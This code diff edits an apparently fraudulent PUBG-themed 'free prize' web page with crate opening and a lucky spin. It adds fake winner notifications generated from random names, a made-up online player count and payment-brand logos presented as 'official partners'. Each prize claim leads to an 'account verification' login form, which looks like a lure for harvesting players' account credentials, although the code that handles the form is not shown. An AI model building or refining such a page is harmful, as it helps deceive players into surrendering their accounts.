@@ -32,7 +32,7 @@
             overflow-x: hidden;
             user-select: none;
             -webkit-tap-highlight-color: transparent;
-            scroll-behavior: smooth;
+            scroll-behavior: smooth; /* Плавный скролл */
         }
 
         /* --- СТИЛИ ПРЕЛОАДЕРА --- */
@@ -79,9 +79,7 @@
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
-        }
-
-        /* ------------------------ */
+        }        /* ------------------------ */
 
         .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
 
@@ -99,7 +97,6 @@
             margin-right: 4px;
         }
 
-        /* Уменьшенный хедер */
         header {
             background: rgba(0, 0, 0, 0.95);
             padding: 8px 16px;
@@ -107,9 +104,8 @@
             flex-direction: column;
             gap: 1px;
             border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-            position: sticky; 
-            top: 0; 
-            z-index: 100;
+            position: sticky; top: 0; z-index: 100;
+            min-height: auto;
         }
 
         .balance-display {
@@ -124,30 +120,23 @@
 
         .btn-plus {
             background: #4caf50;
-            width: 16px; 
-            height: 16px;
+            width: 16px; height: 16px;
             border-radius: 50%;
-            display: flex; 
-            align-items: center; 
-            justify-content: center;
-            font-size: 10px; 
-            font-weight: bold;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 10px; font-weight: bold;
         }
 
         .case-container {
             position: relative;
-            width: 100%; 
-            height: 180px;
+            width: 100%; height: 180px;
             overflow: hidden;
             margin: 20px 0;
         }
 
         .case-line {
             position: absolute;
-            top: 0; 
-            left: 50%;
-            width: 2px; 
-            height: 100%;
+            top: 0; left: 50%;
+            width: 2px; height: 100%;
             background: var(--pubg-gold);
             z-index: 20;
             box-shadow: 0 0 15px var(--pubg-gold);
@@ -205,72 +194,55 @@
         }
 
         .nav-bar {
-            position: fixed; 
-            bottom: 0; 
-            left: 0; 
-            right: 0;
-            background: #000; 
-            height: 65px;
-            display: flex; 
-            justify-content: space-around; 
-            align-items: center;
+            position: fixed; bottom: 0; left: 0; right: 0;
+            background: #000; height: 65px;
+            display: flex; justify-content: space-around; align-items: center;
             border-top: 1px solid rgba(255, 255, 255, 0.05);
             z-index: 50;
         }
-        
-        .nav-item { 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            color: #444; 
-            font-size: 10px; 
-            cursor: pointer;
-        }
-        
+        .nav-item { display: flex; flex-direction: column; align-items: center; color: #444; font-size: 10px; cursor: pointer;}
         .nav-item.active { color: var(--pubg-gold); }
 
         .modal {
-            position: fixed; 
-            inset: 0; 
-            background: rgba(0,0,0,0.95);
-            z-index: 1000; 
-            display: none; 
-            flex-direction: column; 
-            padding: 20px;
+            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
+            z-index: 1000; display: none; flex-direction: column; padding: 20px;
             justify-content: center;
         }
+        .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
         
-        .login-card { 
-            background: white; 
-            color: black; 
-            border-radius: 16px; 
-            padding: 24px; 
+        /* Новые стили для изображений игр */
+        .game-card-image {
+            width: 100%;
+            height: 140px;
+            object-fit: cover;
+            border-radius: 12px;
+            margin-bottom: 12px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
         }
         
-        input { 
-            width: 100%; 
-            padding: 14px; 
-            margin: 10px 0; 
-            border: 1px solid #ddd; 
-            border-radius: 8px; 
-            color: black;
+        /* Стили для партнеров внизу */
+        .partners-section {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px 16px;
+            margin-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
         }
-
-        /* Стили для иконок платежных систем */
-        .payment-icons {
+        
+        /* Стили для победителей */
+        .winner-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: 2px solid #ffbc00;
+            object-fit: cover;
+            background: linear-gradient(45deg, #1a1a1a, #333);
             display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 15px;
             align-items: center;
-            padding: 10px 0;
-        }
-
-        .payment-icon {
-            height: 24px;
-            object-fit: contain;
-            filter: brightness(0) invert(1);
-            opacity: 0.8;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
         }
     </style>
 </head>
@@ -279,23 +251,22 @@
     <!-- ПРЕЛОАДЕР -->
     <div id="preloader">
         <div class="loader-box">
-            <div class="spinner-snake"></div>
-            <span>loading...</span>
+            <div class="spinner-snake"></div><span>loading...</span>
         </div>
     </div>
 
-    <!-- Уведомление о победителе -->
-    <div id="live-winner" class="fixed top-16 left-4 z-[1000] bg-black/80 border-l-4 border-yellow-500 p-3 rounded-r-lg shadow-2xl transform -translate-x-[150%] transition-transform duration-500 flex items-center gap-3">
-        <img id="winner-img" src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" class="w-10 h-10 rounded-full border-2 border-gray-600">
+    <div id="live-winner" class="fixed top-20 left-4 z-[1000] bg-black/80 border-l-4 border-yellow-500 p-3 rounded-r-lg shadow-2xl transform -translate-x-[150%] transition-transform duration-500 flex items-center gap-3">
+        <div class="winner-avatar">
+            <i class="fas fa-user-secret text-lg"></i>
+        </div>
         <div>
             <div id="winner-name" class="text-xs font-bold text-yellow-400">Player123</div>
             <div id="winner-item" class="text-[10px] text-white">получил M416 Glacier</div>
         </div>
     </div>
 
-    <!-- Хедер (уменьшенный) -->
     <header class="flex flex-col gap-1 border-b border-white/10">
-        <div class="flex justify-between items-center px-4 py-1">
+        <div class="flex justify-between items-center px-4 py-2">
             <div class="flex items-center gap-2">
                 <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                 <span class="text-[10px] text-gray-400 uppercase tracking-tighter">Server Online: <span class="text-white">2,841 players</span></span>
@@ -318,39 +289,23 @@
         </div>
     </header>
 
-    <!-- Главный экран -->
     <main id="section-hub" class="p-4">
         <div class="grid grid-cols-2 gap-4 mt-2">
             <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('case')">
-                <!-- Новая картинка для GIFT DROP -->
-                <img src="https://i.imgur.com/5Wk3B9T.png" class="h-32 mx-auto mb-2 rounded-xl object-cover">
+                <img src="https://images.unsplash.com/photo-1542751371-adc38448a05e?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" class="game-card-image">
                 <div class="pubg-font text-blue-400 text-lg">GIFT DROP</div>
+                <div class="text-xs text-gray-400 mt-1">Открывай кейсы и забирай награды</div>
             </div>
             <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('spin')">
-                <!-- Новая картинка для LUCKY SPIN -->
-                <img src="https://i.imgur.com/7Q9Jz8F.png" class="h-32 mx-auto mb-2 rounded-xl object-cover">
+                <img src="https://images.unsplash.com/photo-1511512578047-dfb367046420?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" class="game-card-image">
                 <div class="pubg-font text-yellow-500 text-lg">LUCKY SPIN</div>
-            </div>
-        </div>
-        
-        <!-- Блок с платежными системами (упрощенный) -->
-        <div class="mt-8 px-4">
-            <p class="text-center text-[10px] uppercase tracking-widest mb-2 text-gray-400">Official Partners & Secure Payments</p>
-            <div class="payment-icons">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="payment-icon" style="height: 20px;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="payment-icon" style="height: 20px;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Apple-logo.png" class="payment-icon" style="height: 22px;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_Pay_Logo.svg" class="payment-icon" style="height: 20px;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/PayPal_Logo_Icon_2014.svg" class="payment-icon" style="height: 20px;">
-                <i class="fab fa-cc-visa text-2xl text-gray-300"></i>
-                <i class="fab fa-cc-mastercard text-2xl text-gray-300"></i>
+                <div class="text-xs text-gray-400 mt-1">Крути рулетку и выигрывай</div>
             </div>
         </div>
     </main>
 
-    <!-- Секция кейсов -->
     <section id="section-case" style="display: none;">
-        <div class="text-center py-4">
+        <div class="text-center py-6">
             <h2 class="pubg-font text-3xl text-white">Classic Crate</h2>
         </div>
         <div class="case-container">
@@ -361,7 +316,6 @@
         <button id="depositBtn" onclick="startAuth()" class="btn-blue" style="display: none;">Забрать приз</button>
     </section>
 
-    <!-- Секция рулетки -->
     <section id="section-spin" style="display: none;" class="p-5">
         <div class="text-center py-4">
             <h2 class="pubg-font text-3xl text-white">Lucky Spin</h2>
@@ -373,8 +327,7 @@
                 <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s2"><img src="priz3.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
                 <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s7"><img src="priz4.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
                 <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="mid"><img src="priz5.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s3"><img src="priz6.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s6"><img src="priz7.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s3"><img src="priz6.png" class="w-full h-full object-contain" style="opacity: 1;"></div><div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s6"><img src="priz7.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
                 <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s5"><img src="priz8.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
                 <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s4"><img src="priz9.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
             </div>
@@ -383,7 +336,6 @@
         <button id="spinDepositBtn" class="btn-blue !mx-0 !bg-blue-600 !text-white !w-full" style="display: none;" onclick="startAuth()">Забрать приз</button>
     </section>
 
-    <!-- Модальные окна -->
     <div id="modalAuth" class="modal">
         <div class="login-card">
             <h2 class="font-black text-xl mb-4 text-center">Верификация аккаунта</h2>
@@ -402,7 +354,18 @@
         </div>
     </div>
 
-    <!-- Навигация -->
+    <!-- Партнеры и безопасные платежи -->
+    <div class="partners-section">
+        <p class="text-center text-[10px] uppercase tracking-widest mb-4 text-gray-400">Official Partners & Secure Payments</p>
+        <div class="flex flex-wrap justify-center gap-6 items-center">
+            <i class="fab fa-cc-visa text-3xl text-blue-600"></i>
+            <i class="fab fa-cc-mastercard text-3xl text-red-600"></i>
+            <i class="fab fa-apple-pay text-4xl text-black"></i>
+            <i class="fab fa-google-pay text-4xl text-blue-800"></i>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2e/Visa_2021.svg/320px-Visa_2021.svg.png" class="h-4">
+        </div>
+    </div>
+
     <nav class="nav-bar">
         <div class="nav-item" onclick="showSection('case')"><i class="fas fa-box-open text-xl mb-1"></i><span>Cases</span></div>
         <div class="nav-item active" id="nav-hub" onclick="showSection('hub')"><i class="fas fa-gamepad text-xl mb-1"></i><span>Games</span></div>
@@ -434,7 +397,6 @@
             const item = items[Math.floor(Math.random() * items.length)];
             document.getElementById('winner-name').innerText = names[Math.floor(Math.random() * names.length)];
             document.getElementById('winner-item').innerText = 'выбил ' + item.name;
-            document.getElementById('winner-img').src = item.img;
 
             winner.classList.remove('-translate-x-[150%]');
             setTimeout(() => {
@@ -483,6 +445,7 @@
                 do { idx = Math.floor(Math.random() * prizeImages.length); } while (idx === lastIdx);
                 lastIdx = idx;
                 
+                // Случайный класс редкости
                 const rarityClasses = ['common', 'rare', 'epic', 'legendary'];
                 const rarity = rarityClasses[Math.floor(Math.random() * rarityClasses.length)];
                 
